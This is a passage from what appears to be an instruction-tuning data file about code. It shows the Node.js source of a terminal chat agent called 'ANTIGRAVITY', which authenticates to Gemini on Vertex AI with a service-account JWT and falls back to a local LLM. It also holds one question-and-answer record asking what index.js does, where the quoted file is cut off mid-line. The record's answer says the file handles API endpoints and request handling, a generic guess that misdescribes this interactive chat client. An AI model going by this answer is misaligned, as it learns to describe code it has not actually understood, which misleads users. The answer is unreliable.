â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• AUTH â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nasync function getGoogleAccessToken() {\n    try {\n        const keyFile = JSON.parse(fs.readFileSync(CONFIG.serviceAccountPath, 'utf8'));\n\n        // Create JWT\n        const now = Math.floor(Date.now() / 1000);\n        const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');\n        const payload = Buffer.from(JSON.stringify({\n            iss: keyFile.client_email,\n            scope: 'https://www.googleapis.com/auth/cloud-platform',\n            aud: 'https://oauth2.googleapis.com/token',\n            iat: now,\n            exp: now + 3600\n        })).toString('base64url');\n\n        // Sign JWT (using native crypto)\n        const crypto = await import('crypto');\n        const sign = crypto.createSign('RSA-SHA256');\n        sign.update(`${header}.${payload}`);\n        const signature = sign.sign(keyFile.private_key, 'base64url');\n\n        const jwt = `${header}.${payload}.${signature}`;\n\n        // Exchange JWT for access token\n        const response = await fetch('https://oauth2.googleapis.com/token', {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n            body: `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=${jwt}`\n        });\n\n        const data = await response.json();\n        return data.access_token;\n    } catch (error) {\n        return null;\n    }\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• LLM PROVIDERS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nasync function askGemini(message, history) {\n    if (!accessToken) {\n        accessToken = await getGoogleAccessToken();\n    }\n    if (!accessToken) return null;\n\n    const url = `https://${CONFIG.gemini.location}-aiplatform.googleapis.com/v1/projects/${CONFIG.gemini.project}/locations/${CONFIG.gemini.location}/publishers/google/models/${CONFIG.gemini.model}:generateContent`;\n\n    const response = await fetch(url, {\n        method: 'POST',\n        headers: {\n            'Authorization': `Bearer ${accessToken}`,\n            'Content-Type': 'application/json'\n        },\n        body: JSON.stringify({\n            contents: [\n                ...history.map(h => ({\n                    role: h.role === 'assistant' ? 'model' : 'user',\n                    parts: [{ text: h.content }]\n                })),\n                { role: 'user', parts: [{ text: message }] }\n            ],\n            generationConfig: {\n                temperature: 0.7,\n                maxOutputTokens: 1024\n            },\n            systemInstruction: {\n                parts: [{ text: 'You are Antigravity, an expert AI coding assistant. Be concise, helpful, and friendly. Use emojis occasionally.' }]\n            }\n        })\n    });\n\n    const data = await response.json();\n    return data.candidates?.[0]?.content?.parts?.[0]?.text || null;\n}\n\nasync function askLocal(message, history) {\n    const response = await fetch(CONFIG.localLLM, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({\n            model: 'local-model',\n            messages: [\n                { role: 'system', content: 'You are Antigravity, an expert AI coding assistant. Be concise, helpful, and friendly. Use emojis occasionally.' },\n                ...history,\n                { role: 'user', content: message }\n            ],\n            temperature: 0.7,\n            max_tokens: 800\n        })\n    });\n\n    const data = await response.json();\n    return data.choices?.[0]?.message?.content || null;\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• MAIN CHAT â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nasync function chat(message) {\n    history.push({ role: 'user', content: message });\n\n    const spinner = ora({\n        text: chalk.hex('#00d2ff')(' thinking...'),\n        spinner: 'dots12',\n        color: 'magenta'\n    }).start();\n\n    let reply = null;\n    let provider = null;\n\n    // Try Gemini first\n    try {\n        reply = await askGemini(message, history.slice(-20));\n        if (reply) provider = 'Gemini';\n    } catch (e) { }\n\n    // Fallback to local\n    if (!reply) {\n        try {\n            reply = await askLocal(message, history.slice(-20));\n            if (reply) provider = 'Local';\n        } catch (e) { }\n    }\n\n    spinner.stop();\n\n    if (reply) {\n        history.push({ role: 'assistant', content: reply });\n        const badge = provider === 'Gemini' ? chalk.hex('#4285f4')('[Gemini]') : chalk.hex('#00ff85')('[Local]');\n        console.log('');\n        console.log(chalk.hex('#bc13fe')('  ðŸ¤– ') + chalk.gray(badge) + ' ' + chalk.white(reply));\n        console.log('');\n    } else {\n        console.log('');\n        console.log(chalk.hex('#ff5f56')('  âš ï¸  No LLM available. Start LM Studio or check GCP credentials.'));\n        console.log('');\n    }\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• UI â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nconst sleep = (ms) => new Promise(r => setTimeout(r, ms));\nconst neon = gradient(['#bc13fe', '#00d2ff', '#00ff85']);\n\nasync function intro() {\n    console.clear();\n\n    const lines = figlet.textSync('ANTIGRAVITY', { font: 'ANSI Shadow' }).split('\\n');\n    for (const line of lines) {\n        console.log(neon(line));\n        await sleep(60);\n    }\n\n    console.log('');\n    await sleep(200);\n\n    // Status check\n    const hasGemini = fs.existsSync(CONFIG.serviceAccountPath);\n    const geminiStatus = hasGemini ? chalk.hex('#00ff85')('âœ“ Gemini') : chalk.hex('#ff5f56')('âœ— Gemini');\n    const localStatus = chalk.hex('#ffbd2e')('? Local LLM');\n\n    console.log(chalk.gray(`  Providers: ${geminiStatus} ${localStatus}`));\n    console.log('');\n\n    // Welcome\n    const welcome = \"  Hello! I'm your AI coding assistant. How can I help you today?\";\n    process.stdout.write(chalk.hex('#00d2ff')('\\n  ðŸ¤– '));\n    for (const char of welcome) {\n        process.stdout.write(chalk.white(char));\n        await sleep(15);\n    }\n\n    console.log('\\n');\n    console.log(chalk.gray('  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€'));\n    console.log(chalk.gray('  Type your message and press Enter. Type \"exit\" to quit.'));\n    console.log(chalk.gray('  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€'));\n    console.log('');\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• MAIN â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nasync function main() {\n    await intro();\n\n    const rl = readline.createInterface({\n        input: process.stdin,\n        output: process.stdout\n    });\n\n    const prompt = () => {\n        rl.question(chalk.hex('#00ff85')('  You: '), async (input) => {\n            const trimmed = input.trim();\n\n            if (trimmed.toLowerCase() === 'exit') {\n                console.log(chalk.gray('\\n  ðŸ‘‹ Goodbye!\\n'));\n                rl.close();\n                process.exit(0);\n            }\n\n            if (trimmed) {\n                await chat(trimmed);\n            }\n\n            prompt();\n        });\n    };\n\n    prompt();\n}\n\nmain().catch(console.error);\n\n```"}
{"instruction": "What does the file index.js do?", "input": "```js\n#!/usr/bin/env node\n/**\n * ANTIGRAVITY - Direct Chat Agent\n * Uses Gemini (GCP) with fallback to local LLM\n */\n\nimport chalk from 'chalk';\nimport ora from 'ora';\nimport figlet from 'figlet';\nimport gradient from 'gradient-string';\nimport readline from 'readline';\nimport fs from 'fs';\nimport path from 'path';\nimport { fileURLToPath } from 'url';\n\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• CONFIG â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nconst CONFIG = {\n    gemini: {\n        project: 'gen-lang-client-0988614926',\n        location: 'us-central1',\n        model: 'gemini-1.5-flash'\n    },\n    localLLM: 'http://localhost:1234/v1/chat/completions',\n    serviceAccountPath: path.join(__dirname, '..', 'pipeline', 'keys', 'service-account.json')\n};\n\nlet history = [];\nlet accessToken = null;\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• AUTH â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nasync function getGoogleAccessToken() {\n    try {\n        const keyFile = JSON.parse(fs.readFileSync(CONFIG.serviceAccountPath, 'utf8'));\n\n        // Create JWT\n        const now = Math.floor(Date.now() / 1000);\n        const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');\n        const payload = Buffer.from(JSON.stringify({\n            iss: keyFile.client_email,\n            scope: 'https://www.googleapis.com/auth/cloud-platform',\n            aud: 'https://oauth2.googleapis.com/token',\n            iat: now,\n            exp: now + 3600\n        })).toString('base64url');\n\n        // Sign JWT (using native crypto)\n        const crypto = await import('crypto');\n        const sign = crypto.createSign('RSA-SHA256');\n        sign.update(`${header}.${payload}`);\n        const signature = sign.sign(keyFile.private_key, 'base64url');\n\n        const jwt = `${header}.${payload}.${signature}`;\n\n        // Exchange JWT for access token\n        const response = await fetch('https://oauth2.googleapis.com/token', {\n            method: 'POST',\n            headers: { 'Content-Type\n```", "output": "This file `index.js` is part of the cli project. Based on the code structure, it appears to handle API endpoints and request handling."}
